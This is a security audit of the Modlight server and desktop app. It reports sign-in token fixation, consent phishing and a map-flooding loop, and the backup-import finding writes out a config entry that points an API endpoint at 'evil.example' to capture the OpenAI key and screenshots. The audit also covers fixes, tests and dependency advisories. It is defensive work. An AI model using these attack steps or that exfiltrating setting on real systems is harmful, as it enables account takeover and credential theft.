# Security review: Modlight Rust delta (2026-10-24)

Scope: what changed in `/Users/marcinasdfg/Desktop/modlight` (main at `272ba8f`) since the two
earlier audits, before the owner relies on it in production (`https://files.h81.pl`, behind
Cloudflare):

- server: `git diff d665cb6..HEAD -- server` (earlier audit: `docs/audit/rust-server.md`);
- app: `git diff d59e3c7..HEAD -- app` (earlier audit: `docs/audit/rust-app.md`, findings
  W1-W3 and S3 fixed).

Main pieces reviewed: Cloudflare Turnstile (server), the desktop sign-in server pickup (server +
SPA + app), chunked tus uploads (app), the Windows port (`app/crates/modlight-windows` and the
Windows branches of the shared crates), plus a pass over the new app tool crates
(`modlight-tools`, `modlight-effects`) for anything that sends data out, and a dependency
advisory scan (owner's request, section "Dependencies and known vulnerabilities").

Method: static reading; small targeted tests in a scratch copy
(`_scratch/sec-review-3/srv`, an `git archive` of HEAD, never the main checkout); `cargo audit`
and `pnpm audit` on copies of the lockfiles. The Windows code cannot run here and was reviewed
statically. Nothing was sent to `files.h81.pl`, KUWASZ or the owner's stacks; no secrets were
printed; nothing was committed or pushed.

## Short verdict

No Critical or High issue in the new code. The Turnstile integration is correct and fails closed.
The Windows port is careful (sound FFI, owner-only pipe and cookie ACLs, pinned component digests,
an updater that only reveals the file). The real problems are in the new **desktop sign-in
pickup**, whose security rests on `state` + `challenge`, and both of them sit in the browser URL:

- anyone who sees that URL (browser history or sync, an extension, a shared screen, proxy or
  Cloudflare logs) and has any account on the server can put **their own token** into the
  victim's app (login CSRF / account fixation), or cancel the sign-in;
- the pickup turns consent phishing into **remote token theft**: approving a link the attacker
  generated now hands the victim's token to the attacker's machine. Before the pickup, such a token
  went only to `127.0.0.1` on the victim's own machine.

In the app, a settings backup can still redirect a stored secret to a host of the attacker's
choosing, this time the **AI provider key** (same pattern as W1, through a new setting).

| # | Severity | Finding | Status |
|---|---|---|---|
| P1 | Medium | Pickup: a third party who knows the authorize URL can plant its own token in the victim's app (fixation) or deny the sign-in | confirmed (test) |
| P2 | Medium | Pickup: consent phishing now delivers the victim's token to the attacker remotely | confirmed (test) |
| A1 | Medium | Backup import can set `OpenAICustomURL`; the OpenAI key from the credential store and the screenshots then go to the attacker | confirmed by reading |
| P3 | Low | Pickup map: any signed-in account can flush it (4096 entries, no per-user limit on registration) | confirmed by reading |
| D1 | Low (deployment) | Behind Cloudflare every per-IP limit (pickup, auth, Turnstile `remoteip`) depends on `X-Real-IP` being the visitor, not the edge | needs a check on the server |
| W1w | Low | Windows: no `SetDefaultDllDirectories`; the updater leaves the installer in a user folder for the person to start | informational, defence in depth |
| T1 | Info | Turnstile: `api.js` is third-party script with full page access, including `/login?next=/authorize?...state...challenge` | by design |

Dependency advisories are summarised in their own section below.

## Status after the fixes (branch `sec-fix-3`, 2026-10-24)

| # | Status | Commit | What changed | Tests |
|---|---|---|---|---|
| P1 | fixed | `9aa981b` | The `/authorize` loader registers the pending entry with the signed-in **user id** (`PickupStore::register(state, challenge, user_id)`). `approveDesktopClient` / `denyDesktopClient` store an outcome only on a live entry that the same account registered with the same challenge; a state never registered, or registered by another account, stores nothing. Another account's render never takes a live entry over. The approval then answers `pickup: false` and the page falls back to upstream's loopback POST and manual key (both reach only the approver's own machine). The pickup route still gives one 404 for unknown, expired and mismatched. | `tests/secreview_pickup.rs` (the review's attacks, now asserting that they fail): `attacker_who_saw_the_url_cannot_plant_his_token_in_the_victims_app`, `attacker_who_saw_the_url_cannot_cancel_the_sign_in`, `an_approval_for_a_state_never_registered_reaches_no_app`, `registering_first_with_another_challenge_gives_the_attacker_nothing`; `pickup::tests::only_the_account_that_rendered_the_page_decides`, `a_state_nobody_registered_takes_no_decision`; `actions::authorize::tests::an_approval_for_a_state_this_account_never_rendered_stays_on_its_page`; `web/tests/authorize-pickup.test.tsx` (fallback on `pickup: false`); e2e `another_account_cannot_decide_for_the_app` |
| P2 | mitigated | `9835a92` | A confirmation code, the first 6 base32 characters of `SHA-256("modlight-confirm:" \|\| challenge)` shown as `XXX-XXX`, is computed on both sides (server `pickup::confirmation_code`, app `signin::confirmation_code`, shared test vector `554-LIO`). The prompt's pickup variant shows it next to Approve with "Approve only if this code matches the one in your Modlight app" and says the key will be handed to the Modlight app that shows that code, wherever it runs (EN/PL, `messages/*/authorizePickup.json`). The app's sign-in window shows the code while it waits (QA screen `sign-in-waiting`, snapshots light/dark EN/PL). The loopback flow is unchanged. Residual risk: a person who approves without comparing the codes is still phished (as with any device-code flow). Fix 3 of the review (audit the polling IP) not done. | `pickup::tests::the_confirmation_code_is_six_base32_characters_of_the_challenge`, `secreview_pickup::a_phishing_link_shows_a_code_no_app_of_the_victims_shows`, app `signin::tests::the_confirmation_code_matches_the_server`, `web/tests/authorize-pickup.test.tsx` ("shows the app's code next to Approve"), snapshot `sign-in-waiting/*`, e2e (payload `confirmCode` equals the app's code) |
| A1 | fixed | `2cf083f` | Backup import resets, in every task's `ToolsSettings.AIOptions`, `OpenAICustomURL` and any other `...URL` / `...Endpoint` member that differs from the value before the import (to the default, `null`), and lists it in the import summary (`BackupImportAIURL`). Defence in depth: the OpenAI key is stored as `{base, key}` with the base URL it was entered for (a key from an earlier build counts as the default endpoint); `ai_options` loads it only for the same base, otherwise sends no key and the analyze window asks to enter it again (`AIKeyOtherAddress`). | `backup::tests::an_ai_address_a_backup_brings_goes_back_to_the_default`, `settings::tests::the_openai_key_is_bound_to_its_address`, `tools::analyze::tests::the_openai_key_never_goes_to_another_address` |
| P3 | fixed | `35d9565` | At most 5 live entries per account (a new render replaces that account's own oldest pending entry, or is refused when all 5 are decided); a full map evicts the oldest **pending** entry; a decided entry is never evicted before it expires. Renders that register are rate-limited: 30 per account and 120 per address per 10 minutes (`register_render`). | `pickup::tests::one_account_can_hold_only_a_few_entries`, `a_decided_entry_is_never_evicted_before_it_expires`, `page_renders_are_rate_limited_per_account`, `the_map_is_swept_and_bounded`; `secreview_pickup::a_register_flood_does_not_evict_other_accounts_entries` |
| D1 | open (deployment) | - | Needs the check on the production nginx; no code change. | - |
| W1w, T1 | open / by design | - | Unchanged. | - |
| Deps | updated | `013f07f` | Server: `rustls-webpki` 0.103.15 -> 0.103.16, `webpki-roots` 1.0.9 -> 1.0.10, `ctutils` 0.4.3 -> 0.4.4. App: `rustls-webpki` 0.103.15 -> 0.103.16, `webpki-root-certs` 1.0.9 -> 1.0.10 (`webpki-roots` was already 1.0.10). Not done: app `tokio` 1.53.3 (the workspace pins `=1.53.2` on purpose; the advisory is a warning, not reachable), `zip` 6 -> 9 (API changes; not reachable today, follow-up), SPA bumps (section below). | full server and app test suites |

Verification (2026-10-24, on `sec-fix-3`): server `cargo fmt --check`, `cargo clippy
--all-targets -D warnings`, `cargo test` with the dev Postgres (1283 passed, 0 failed, database
tests included); `server/web` `npm run verify` (76 tests, build, bundle audit, sync check); app
`cargo fmt --check`, `cargo clippy --workspace --all-targets -D warnings`, `cargo test --workspace`
(715 passed, 0 failed). Real-server e2e (`docs/handoff/signin-pickup.md`, server of this branch on
127.0.0.1:8462 with its own database, two accounts):
`MODLIGHT_PICKUP_E2E=... cargo test -p modlight-api --test signin_pickup`: 4 passed
(`pickup_signs_in_when_the_browser_never_delivers` about 2 s after the approval,
`loopback_still_signs_in_when_the_browser_delivers`, `a_refusal_arrives_through_the_pickup`, and
the new `another_account_cannot_decide_for_the_app`); every run also checks that the page
payload's `confirmCode` equals the app's code and that the owner's approval answers `pickup: true`.


---

## Findings

### [Medium] P1: whoever knows the authorize URL can plant their token in the victim's app, or cancel the sign-in

Files: `server/src/authorize/pickup.rs:149-168` (`complete`), `server/src/actions/authorize.rs:103-108`
(approve stores under the caller-supplied `state` + `challenge`), `:134-146` (`deny_with`),
`server/src/pages/authorize.rs:57-61` (`register`), app `app/crates/modlight-api/src/signin.rs:456-513`.

The pickup entry is keyed by `state` and bound to `challenge`. The design says "the first challenge
seen for a state binds it", which stops someone from substituting a *different* challenge. But the
binding uses the challenge itself, and the challenge is not secret: the app puts it in the link,
`/authorize?port=&name=&state=&challenge=` (and through `/login?next=` when the browser is signed
out). `approveDesktopClient` and `denyDesktopClient` accept `{state, challenge}` from any signed-in
session. No check ties the approving account to the browser or account that opened the page.

Attack: Mallory (any account on the server; with registration closed, any invited user) sees the
victim's authorize URL during its 10-minute life. Ways to see it: Chrome or Firefox history sync to
a shared or compromised account, a malicious or over-privileged extension, screen sharing,
reverse-proxy or Cloudflare request logs, an unlocked shared machine. Mallory then calls
`approveDesktopClient({port, state, name, challenge})` from his own session:

- `complete()` finds the entry, the challenge matches, and stores **Mallory's token**
  (`pickup.rs:155-160`);
- the victim's app polls every 2 s with its secret verifier, gets `200 {"token": <Mallory's>}`,
  `/api/me` succeeds, and the app is signed in to **Mallory's account**. From then on its
  screenshots, recordings and clipboard uploads land in Mallory's library, which he can read. The only
  sign is the account name in the app's sign-in status line.
- if the victim approves first, the app may already have collected the victim's token. Mallory's
  call then creates a fresh entry (the old one was handed out and deleted) that nobody collects.
  The race is lost only when the victim is faster than Mallory. If Mallory sees the URL before
  the victim clicks, he wins, because the poll comes within 2 s.
- with `denyDesktopClient` instead, Mallory ends the victim's sign-in with "access denied" (DoS).
- if Mallory loads the URL before the victim's signed-in browser does (for example while the
  victim is still on `/login?next=...`), `register` binds the state to whatever challenge Mallory
  sends, and the victim's real approval is refused (`complete` returns false): another DoS.

Confirmed with a test against the real server code (`_scratch/sec-review-3/srv/server/tests/secreview_pickup.rs`,
`attacker_who_saw_the_url_plants_his_token_in_the_victims_app`, `attacker_who_saw_the_url_can_cancel_the_sign_in`,
`registering_first_with_another_challenge_blocks_the_victim`): see the test log section below.

Before the pickup the same URL knowledge was worth less. A token minted by Mallory's approval was
POSTed by *Mallory's* browser to *Mallory's* `127.0.0.1`. To inject it into the victim's app he
needed a page running on the victim's machine that could make a no-cors POST to the victim's
loopback port: a narrower and more local attack.

Fix (server, small):
1. Bind the entry to the **account** that opened the page: `register(state, challenge, user_id)`.
   Make `complete` require the same `user_id`, and make a register from a different user a no-op
   while the entry is live. Store the user id in `Entry`.
2. Register from the page loader only, and refuse `complete` for a state that was never
   registered. Then the entry belongs to the first signed-in browser that rendered the prompt,
   normally the victim's own (the URL appears in history at the same moment).
3. Optional: have the pickup answer carry the account's email or name, so the app can show
   "Signed in as X" prominently and ask for confirmation when X is not what the person typed or
   expected.

Residual risk after 1-2: an attacker who renders the URL before the victim's signed-in browser does
can still block it (DoS), but cannot plant a token in it.

### [Medium] P2: consent phishing now yields the victim's token remotely

Files: `server/src/actions/authorize.rs:97-108`, `server/web/src/overrides/components/authorize/authorize-prompt.tsx`
(the pickup variant), `server/messages/*/authorizePickup.json` (`local`).

Mallory generates his own verifier V, builds
`https://files.h81.pl/authorize?port=49732&name=Modlight%20on%20MacBook&state=<his>&challenge=SHA256(V)`
and sends it to a user ("re-connect your Modlight app"). The page is genuine. It names the victim's
account and says the key goes "only to the app that opened this page". If the victim clicks
**Approve**, the token is stored for Mallory's state and challenge, and Mallory's script collects
it with V from anywhere on the internet. Scope `write`: read, upload and delete the victim's files,
create short links. Confirmed by `phishing_link_with_attackers_own_challenge_delivers_victims_token_remotely`.

Without the pickup (and for old apps without a challenge) the approved token is POSTed to
`127.0.0.1:<port>` on the victim's machine, and Mallory never sees it. This is the known risk of
device-authorization-style flows (the "device code phishing" class).

The page keeps its line "If you did not just start this app yourself, close this page", which is
the main mitigation. Fixes, in order of value:
1. A short **confirmation code** shown in the app and on the page, derived from the challenge
   (for example the first 6 base32 characters of `SHA-256("modlight-confirm" || challenge)`).
   The page asks "Does the app show ABC-123?" next to Approve, as device flows do. A phished
   victim has no app showing that code.
2. Make the pickup variant visibly different from the loopback one: "a program on another
   computer could be waiting for this key: approve only if Modlight on THIS computer just opened
   this page".
3. Audit-log every approval with the pickup, so an unexpected "Modlight on ..." token can be traced
   (the token list already shows the name; the IP of the polling client could be added to the
   audit entry).

### [Medium] A1: a settings backup can send the OpenAI API key and screenshots to a host of the attacker's choosing

Files: `app/crates/modlight-core/src/backup.rs:168-221` (import restores
`ApplicationConfig.json`; `disable_new_auto_run` handles external programs, `PerformActions`,
watch folders and the FFmpeg path only),
`app/crates/modlight-tools/src/settings.rs:453-475` (`AIOptions.OpenAICustomURL` is a plain
setting under `DefaultTaskSettings.ToolsSettings.AIOptions`),
`app/crates/modlight-app/src/tools/analyze.rs:1278-1284` (`ai_options`: the keys are loaded
from the credential store and paired with whatever the file says),
`app/crates/modlight-tools/src/analyze.rs:171-186` (`openai_base` uses the custom URL as is).

This is W1's pattern again. The secret (`Modlight/ai-openai-api-key` in Credential Manager or
Keychain) is kept apart from the address it is sent to (the JSON file). A foreign `.sxb` whose
`ApplicationConfig.json` contains
`"ToolsSettings": {"AIOptions": {"Provider": 0, "OpenAICustomURL": "https://evil.example/v1/responses"}}`
is restored as it is. The next "Analyze image" (a tool, a hotkey, or `AutoStartAnalyze` after a region
capture) sends `Authorization: Bearer <the person's OpenAI key>` and the captured picture to
`evil.example`. The Gemini and OpenRouter addresses are fixed in code, so only the OpenAI key is
exposed. Sync is not a vector: `sync/document.rs` drops `AIOptions` both ways.

Confidence: confirmed by reading (the import does not touch `ToolsSettings`; the load path pairs
the stored key with the file's URL). Not run, because it needs a configured key.

Fix: in `backup::import`, treat `OpenAICustomURL` like the FFmpeg path: if the restored value
differs from the current one, reset it to empty (the default endpoint) and list it in the import
report. Defence in depth, as for the account token: store the key bound to the base URL it was
entered for (`{url, key}` in the credential), and refuse to send it to another base until the person
re-enters it.

### [Low] P3: any signed-in account can flush the pickup map

`server/src/authorize/pickup.rs:114-144`, `server/src/pages/authorize.rs:57-61`.

`register` runs on every render of `/authorize` with a challenge (also through `/_page`), with no rate
limit and no per-user cap. Once the map holds 4096 entries the **oldest go first, including
completed ones holding a token** (`make_room`). One account looping over
`GET /_page?path=/authorize?port=1024&state=<random>&challenge=<43 chars>` keeps the map full and
evicts everyone's pending and approved pickups. Their apps then wait for the loopback or the manual key,
which on Safari means the manual key. Memory stays bounded (4096 small entries), so only the
pickup is denied. Fix: rate-limit `register` per user (and per IP), cap live entries per user (for
example 5), and evict pending entries before completed ones.

### [Low, deployment] D1: per-IP limits behind Cloudflare

`server/src/routes/api/authorize_pickup.rs:54-64`, `server/src/turnstile.rs:470`, `auth/ip.rs`.

The pickup limit (120 polls a minute per client IP), the Better Auth limiter, the action throttles
and Turnstile's `remoteip` all use `X-Real-IP` when `TRUST_PROXY=true`, else the socket peer.
Behind Cloudflare -> nginx -> server, this is correct only if nginx restores the visitor's address
(`real_ip_header CF-Connecting-IP` with `set_real_ip_from` for Cloudflare's ranges, then
`proxy_set_header X-Real-IP $remote_addr`). If `X-Real-IP` carries a Cloudflare edge address,
everybody behind one edge shares one bucket. Then a single script can exhaust the pickup limit
(which the app takes as "wait"), and sign-in limits trip for unrelated users. The repository has
no production nginx file, so this could not be checked. Verify on the server; also make sure the
origin accepts traffic only from Cloudflare, or a direct request could set its own
`X-Real-IP` / `CF-Connecting-IP`.

### [Low/Info] W1w: Windows binary planting hygiene

- No `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32 | LOAD_LIBRARY_SEARCH_APPLICATION_DIR)`
  early in `main` (grep: none in the workspace). The GUI stack loads several DLLs by name at run
  time (graphics backends, `dwmapi`, WebView2 through its static loader). Installed under Program
  Files this is harmless. Run from a writable folder (the `.zip` release, Downloads), a planted
  `d3d12.dll` / `opengl32.dll`-style DLL beside it could be picked up. Recommendation: call
  `SetDefaultDllDirectories` first thing in `main` on Windows.
- The updater (`modlight-core/src/update.rs`) accepts `.exe` or `.zip` and only *reveals* the
  verified file; nothing is run. Good. The installer then sits in a user folder and the person starts
  it from there. Inno Setup has its own DLL-planting mitigations; keep Inno Setup current when
  building releases. The verified file is not marked with Mark-of-the-Web (not required, noted).

### [Info] T1: Turnstile script runs with page privileges

When Turnstile is on, `https://challenges.cloudflare.com/turnstile/v0/api.js` is loaded (no SRI,
which Cloudflare does not support) into the app origin on every page whose CSP allows it. It can
read the DOM and `location`, including `/login?next=/authorize?...state=...&challenge=...` (relevant
to P1) and the forms' fields. Cloudflare already terminates TLS for `files.h81.pl`, so this adds no
new party, but it is third-party code in the origin. Accepted by design (SKELETON.md 9.43).

---

## Test log (scratch copy of the server, HEAD 272ba8f)

`_scratch/sec-review-3/srv/server/tests/secreview_pickup.rs`, run with
`cargo test --test secreview_pickup` against the real `approve_with`, `deny_with` and `PickupStore`:

```
test attacker_who_saw_the_url_can_cancel_the_sign_in ... ok
test registering_first_with_another_challenge_blocks_the_victim ... ok
test attacker_who_saw_the_url_plants_his_token_in_the_victims_app ... ok
test phishing_link_with_attackers_own_challenge_delivers_victims_token_remotely ... ok
test result: ok. 4 passed; 0 failed
```

Each test asserts the attack outcome, so "ok" means the attack works: the victim's app,
polling with its own secret verifier, receives `TOKEN-OF-attacker`; an attacker's deny reaches
the victim's app; an attacker's earlier registration locks the victim out; an approval of a
phishing link hands `TOKEN-OF-victim` to the holder of the attacker's verifier. The live HTTP
route was not exercised separately: `handle()` is a thin wrapper over `PickupStore::pick_up`,
already covered by the repository's own route tests.

---

## Data leaving the machine / the server (delta only)

Server (new since d665cb6):

| Destination | What | When |
|---|---|---|
| `https://challenges.cloudflare.com/turnstile/v0/siteverify` (constant) | Turnstile token, secret, visitor IP | only when the administrator turns Turnstile on; 10 s, 64 KiB answer cap, fails closed; the secret is never logged (`Debug` redacts) |
| browser -> `challenges.cloudflare.com` (`api.js`, widget iframe) | Cloudflare's own telemetry from the widget | same condition; CSP adds the origin only then |
| `POST /api/authorize/pickup` (inbound) | gives out a token once to the holder of the verifier | see P1-P3 |

No other new outbound connection in the server (`hyper-util` client is used only by `turnstile.rs`).

App (new since d59e3c7):

| Destination | What | When | Note |
|---|---|---|---|
| account host `POST /api/authorize/pickup` | `{state, verifier}`, no `x-api-key`, no redirects | during browser sign-in | only the origin the sign-in started with |
| account host (tus `PATCH` in 50 MiB chunks) | file bytes, `x-api-key` | uploads | session URL rebased to the account origin before each request (unchanged rule) |
| `api.openai.com` or the custom URL, `generativelanguage.googleapis.com`, `openrouter.ai` | the picture, the prompt, the person's AI key (Gemini: in the URL query, Google's API design) | only "Analyze image" with a key the person entered | see A1 for the custom URL |
| `www.bing.com/images/search?...imgurl:<uploaded URL>` | the public URL of an upload | only on the "search image" action | opened in the browser, parity with upstream |
| Google / Bing / DuckDuckGo / DeepL / Google Translate | OCR text in a URL | only when the person clicks a service link in OCR | opened in the browser |
| `github.com` (ShareX/FFmpeg, yt-dlp, rembg model), `downloads.sourceforge.net` (ExifTool) | plain GETs | Components, by choice | SHA-256 and size pinned per platform (`components/mod.rs:267-379`) |
| update host (`MODLIGHT_DEFAULT_HOST`, build time) | manifest + `.exe`/`.zip` | updates | size + SHA-256, file only revealed |
| WebView2 (YouTube sign-in) -> Google | the person's Google sign-in | on click | InPrivate profile in a temp folder deleted afterwards |

The YouTube cookie jar keeps `.youtube.com` **and `.google.com`** cookies (`webview/host.rs:477-487`,
`webview.rs:105-110`, as on macOS). These are full Google session cookies. The jar is local,
owner-only (protected DACL on the folder and the file, `download/cookies.rs:100-215, 266-291`),
handed only to yt-dlp for YouTube URLs, and never synced or logged. Worth stating to users: the
file is a live Google login.

No telemetry, analytics or "phone home" was found in the delta. Keyboard hooks: one thread-local
`WH_KEYBOARD` hook (`modlight-windows/src/keys.rs:43-64`) that sees only this app's own key
messages, records only Ctrl+V and the special keys egui lacks, and logs nothing. Global
hotkeys use `RegisterHotKey` (the `global-hotkey` crate), not a low-level hook. No mouse hook.

---

## Checked and fine

**Turnstile (server)**
- Guarded paths match better-auth's captcha plugin (`includes` on the normalised path). A
  path-encoding bypass was checked: the router does not percent-decode, so
  `/sign-in%2Femail` is a 404, and a trailing slash is a 404. The check runs after the rate
  limiter and before the body is read. A refusal counts against the bucket.
- The actions (`signInWithIdentifier`, `acceptInvitation`) check before any lookup. Internal
  server calls are deliberately not re-checked (single-use token).
- Siteverify: fixed URL; form-encoded; 10 s timeout; 64 KiB cap; only `200` with
  `success:true` passes, anything else refuses (fails closed). Token length capped (2048), and an empty
  token makes no call. The secret is encrypted at rest (secret box, own purpose), never in
  `Debug`, payloads or logs. The admin actions use `require_admin`, and probes are throttled per admin.
- CSP: the Cloudflare origin is added to `script-src`/`frame-src` only while active; nothing
  else is widened. The `/authorize` policy keeps its own `connect-src`. The SPA's `x-captcha-response`
  header plumbing (`runtime/rpc.ts`) cannot add other headers from outside.

**Pickup (apart from P1-P3)**
- Verifier 32 CSPRNG bytes; S256 challenge (RFC 7636 vector tested); constant-time compare of
  the hash. Unknown, expired and wrong-verifier requests all give the same 404 (no oracle); a wrong
  verifier neither consumes nor deletes the entry; the token is handed out once and then deleted.
- `state` is 32 alphanumeric characters from a CSPRNG, and the verifier 256 bits: no guessing at
  120 requests a minute. Body 1 KiB, `Cache-Control: no-store`; tokens are redacted in `Debug`.
- App side: no `x-api-key` on the pickup, no redirects, origin = the sign-in origin; `/api/me`
  still gates the token. The loopback listener grants CORS and
  `Access-Control-Allow-Private-Network` only to the exact server origin, and compares `state`
  in constant time; a wrong state is ignored.

**Chunked tus (app)**: `send_body` handles server-claimed offsets past the end or going backwards
without underflow (`offset > length` is rejected up front; a non-advancing offset ends in
`Retry`). Session URLs stay rebased to the account origin; reqwest without redirects.

**Windows port**
- Single instance: named pipe with SDDL `O:<user>D:P(A;;GA;;;<user>)`,
  `FILE_FLAG_FIRST_PIPE_INSTANCE`, `PIPE_REJECT_REMOTE_CLIENTS`; the client checks the pipe owner
  before sending and connects with `SECURITY_IDENTIFICATION`. Messages capped at 1 MiB; only
  existing absolute non-device paths are accepted; nothing received is run. Overlapped I/O cancels
  and waits before the `OVERLAPPED` goes away (`integration.rs:921-971`).
- Registry and shell: HKCU only. The context menu command is `"<exe>" "%1"` (quoted). Autostart is a
  `.lnk` in the user's Startup folder with `-silent`. URLs go to `ShellExecuteEx` only as
  http(s), with `"`, space and `\` percent-encoded and control characters refused
  (`system.rs:116-141`). Explorer `/select,"..."` is used for paths.
- Credential Manager: generic credential, `CRED_PERSIST_LOCAL_MACHINE`, value = token bound to
  its origin (the W1 fix carries over); the AI keys are stored the same way, without the
  binding (see A1).
- Clipboard DIB parsing (`pasteboard.rs`): all reads go through bounds-checked helpers; the
  header size, palette and pixel extents are validated with checked arithmetic; dimensions pass the
  shared `image_decode::fits` limit before copying.
- Components: Windows URLs and SHA-256 digests pinned (GitHub ShareX/FFmpeg 8.1 x64/arm64,
  yt-dlp 2026.08.19, ExifTool 13.59 zip). `extract_zip_folder` refuses `..`, drives, ADS (`:`) and
  reserved device names, skips symlinks, and caps entries and bytes. Verification comes before unpacking.
- Child processes: `std::process::Command` (argument vector; Rust's std refuses unsafe
  `.bat`/`.cmd` arguments), job objects with kill-on-close, `CREATE_NO_WINDOW`; yt-dlp keeps `--`
  before the URL.
- Cookie export: YouTube/Google domains only, folder and file owner-only (protected DACL), written
  through a temporary file and renamed. The WebView2 profile is InPrivate in a temp folder that is
  removed when the browser exits, and swept later after a crash.
- Updater: build-time host, size + SHA-256, `.exe`/`.zip` only, the name sanitised against
  `..\`, drive letters and other extensions; nothing executed.
- Backup import (W1-W3 fixes) unchanged on Windows: only `ApplicationConfig.json` and
  `HotkeysConfig.json`, exact names, case-sensitive, new auto-run steps disabled. `BrowserPath`
  is stored but never used to launch anything.
- `.sxie` image-effect packages: only `Config.json` + pictures, no `..`/absolute/backslash
  paths, no links, 100 MB cap (`modlight-effects/src/classic/package.rs`).

## Dependencies and known vulnerabilities

Run on 2026-10-24 against copies of the lockfiles in `_scratch/sec-review-3`:
`cargo audit` 0.22.2 (RustSec database fetched that day) on `server/Cargo.lock` and
`app/Cargo.lock`, and `pnpm audit` (pnpm 10, the project's package manager; `npm audit` cannot
read a pnpm lockfile) on `server/web`, both `--prod` and full. "Reachable" means whether the
vulnerable code runs in Modlight as built and deployed (server in Docker on Linux, app on macOS
and Windows, the SPA in browsers).

### Rust server (`server/Cargo.lock`): 4 advisories

| Advisory | Crate (version) | Severity | Reachable in Modlight | Fixed in | Action |
|---|---|---|---|---|---|
| RUSTSEC-2026-0382 | rustls-webpki 0.103.15 | not rated (TLS validation) | **Yes, partly**: every outbound TLS of the server goes through rustls + webpki (Turnstile siteverify, SMTP via lettre, S3 via aws-sdk, Postgres TLS if used). Accepting a distrusted intermediate needs an attacker with a certificate from that chain plus a network position: low practical risk | >= 0.103.16 | `cargo update -p rustls-webpki` |
| RUSTSEC-2026-0381 | webpki-roots 1.0.9 (and 0.26.11, which re-exports it) | not rated | Yes, same paths (the bundled Mozilla roots used by hyper-rustls and lettre) | >= 1.0.10 | `cargo update -p webpki-roots@1.0.9` |
| RUSTSEC-2026-0385 | ctutils 0.4.3 | not rated (timing) | Practically no: pulled in by `digest` 0.11 for aws-sdk-s3 request signing (HMAC is computed, never compared to a secret). The server's own secret comparisons use `subtle` / `constant_time_eq` | >= 0.4.4 | `cargo update -p ctutils` |
| RUSTSEC-2023-0071 | rsa 0.9.10 (Marvin attack) | CVSS 5.9 | **No**: only `sqlx-mysql` depends on it. It is in the lockfile but not compiled (`cargo tree -i rsa --target all` prints nothing; the server uses Postgres only) | none published | nothing; disappears if sqlx's MySQL support is ever dropped from the lock |

### Rust app (`app/Cargo.lock`): 5 advisories, 8 warnings

| Advisory | Crate (version) | Severity | Reachable in Modlight | Fixed in | Action |
|---|---|---|---|---|---|
| RUSTSEC-2026-0367 | zip 6.0.0 (SUID/SGID kept on extract) | CVSS 7.8 | **No**: the app never calls `ZipArchive::extract`. Every archive (components, backups, `.sxie`) is unpacked entry by entry with `safe_relative`, files are created by the app with fixed modes (0644/0755), and symlinks are skipped | >= 9.0.0 | upgrade when convenient (the API between 6 and 9 changed; re-run the archive tests) |
| RUSTSEC-2026-0368 | zip 6.0.0 (`extract` creates symlinks outside the target) | not rated | No, same reason | >= 9.0.0 | as above |
| RUSTSEC-2026-0369 | zip 6.0.0 (`extract` applies permissions through symlinks) | CVSS 9.1 | No, same reason | >= 9.0.0 | as above |
| RUSTSEC-2026-0382 | rustls-webpki 0.103.15 | not rated | Hardly: reqwest uses `rustls-platform-verifier`, so on macOS and Windows the OS verifies the chain (Security.framework / CryptoAPI), not webpki's path builder | >= 0.103.16 | `cargo update -p rustls-webpki` |
| RUSTSEC-2026-0383 | webpki-root-certs 1.0.9 | not rated | No on macOS/Windows (used by the platform verifier only on other systems) | >= 1.0.10 | `cargo update -p webpki-root-certs` |
| RUSTSEC-2026-0386 (warning, unsound) | tokio 1.53.2 (`AsyncFd::new` I/O safety) | n/a | No: no `AsyncFd` in Modlight's code; the dependencies give it valid descriptors | >= 1.53.3 | `cargo update -p tokio` |
| RUSTSEC-2024-0429 (warning, unsound) | glib 0.18.5 | n/a | No: Linux GTK only (dialog/tray backends), not built for macOS/Windows | >= 0.20 | none needed for the shipped targets |
| RUSTSEC-2024-0370, -2026-0206, -0192, -0371, -0370, -0372 (unmaintained) | proc-macro-error, rustybuzz, ttf-parser, zbus_names, zvariant, zvariant_derive | n/a | not vulnerabilities; zbus is Linux only; rustybuzz/ttf-parser parse fonts (the app's own bundled fonts and system fonts) | n/a | track; no action |

Note: the app enables `ort` with `download-binaries`, so the build fetches a prebuilt ONNX
Runtime from its publisher (build time only, the `ort-sys` crate checks the archive hash). No run-time
download.

### SPA (`server/web`, pnpm): production 16 entries (8 high, 7 moderate, 1 low), full tree 75 (1 critical, 32 high, 38 moderate, 4 low)

What actually reaches users is the static bundle in `server/web/dist` (the Rust server serves it;
no Node runs in production). Of the production-tree advisories, the bundle contains only
`better-auth`'s **client** (the `auth-client` chunk) and `nanoid` (through `@uppy/core`).
Everything else in the production list sits under `better-auth`'s own dependency tree
(`vitest`, `vite`, `postcss`, `zod`, `source-map-js`) and is not imported by the SPA.

| Advisory | Package (version) | Severity | Reachable | Fixed in |
|---|---|---|---|---|
| GHSA-qq9h-g4jm-xgf3 | better-auth 1.6.13 (pre-account hijacking via magic-link / email-OTP) | high | **No**: a server-side flaw; the server is the Rust port, which has no magic-link or email-OTP sign-in (only rate-limit path names in `auth/rate_limit.rs:53-54`). Only the browser client is bundled | >= 1.6.22 |
| GHSA-28wg-ghj8-5hjv, GHSA-2v37-7h3g-55p8 | nanoid 5.1.11 (uppy), 3.3.12 (postcss) | high | No: only the non-secure/custom generators with a negative or zero size loop; uppy calls them with fixed positive sizes | >= 5.1.16 / >= 3.3.18 |
| GHSA-mrhx-c7xc-m3w5 | zod 4.4.3 (via better-auth) | high | No: not imported by the SPA | >= 4.6.6 |
| GHSA-r28c-9q8g-f849, GHSA-fxqj-rqcc-2cmp | postcss 8.5.15 | high / moderate | Build time only (Tailwind); reads source maps of our own CSS | >= 8.5.23 |
| GHSA-68fv-2mgg-jv7q | source-map-js 1.2.1 | high | Build time only | >= 1.2.2 |
| GHSA-587h-7wmj-h5pm, GHSA-r825-w8mm-5pxw, GHSA-698v-4r3x-3vcv, GHSA-rq7h-c2jc-7f22, GHSA-9jrq-w75r-8gcw | vite 8.0.16 | high / moderate / low | Dev server only (`vite dev`); not in production. Matters on a developer machine while the dev server runs | >= 8.1.6 |
| GHSA-82fw-gwwq-j7x9, GHSA-qxg6-89mg-rqv8 | vitest / @vitest/mocker 4.1.8 | moderate | Test runner only | >= 4.1.12 |

Full tree only (development tools, never in the bundle): `proxy-addr` 2.0.7 (critical,
GHSA-jqcg-44mw-7w3h), `hono` 4.12.23 (17 advisories), `@modelcontextprotocol/sdk` 1.29.0 (5),
`fast-uri` 3.1.2 (8), `ip-address` 10.2.0 (8), `express`/`body-parser`/`qs`, `brace-expansion`
